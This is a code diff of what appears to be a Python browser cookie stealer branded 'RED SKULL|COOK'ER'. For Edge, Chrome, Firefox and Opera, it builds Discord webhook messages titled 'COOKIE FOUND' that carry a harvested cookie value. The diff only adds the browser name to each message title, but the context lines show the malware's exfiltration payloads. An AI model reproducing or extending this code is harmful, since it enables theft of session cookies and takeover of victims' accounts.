@@ -13,7 +13,7 @@ def MicrosoftEdge():
             "username" : "RED SKULL|COOK'ER",
             "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
             "embeds": [{
-            "title": "COOKIE FOUND", 
+            "title": "COOKIE FOUND|Browser : Edge", 
             "description": f"```{cookie}```", 
             "color": 16711680,
                 "image":{
@@ -36,7 +36,7 @@ def GoogleChrome():
             "username" : "RED SKULL|COOK'ER",
             "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
             "embeds": [{
-                "title": "COOKIE FOUND", 
+                "title": "COOKIE FOUND|Browser : Chrome", 
                 "description": f"```{cookie}```", 
                 "color": 16711680,
                 "image":{
@@ -61,7 +61,7 @@ def MozillaFirefox():
             "username" : "RED SKULL|COOK'ER",
             "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png", 
             "embeds": [{
-                "title": "COOKIE FOUND", 
+                "title": "COOKIE FOUND|Browser : Firefox", 
                 "description": f"```{cookie}```", 
                 "color": 16711680,
                 "image":{
@@ -85,7 +85,7 @@ def Opera():
             "username" : "RED SKULL|COOK'ER",
             "avatar_url" : "https://cdn.discordapp.com/attachments/1071405002570092577/1072887295465771008/skull.png",
             "embeds": [{
-                "title": "COOKIE FOUND",
+                "title": "COOKIE FOUND|Browser : Opera",
                 "description": f"```{cookie}```",
                 "color": 16711680,
                 "image":{
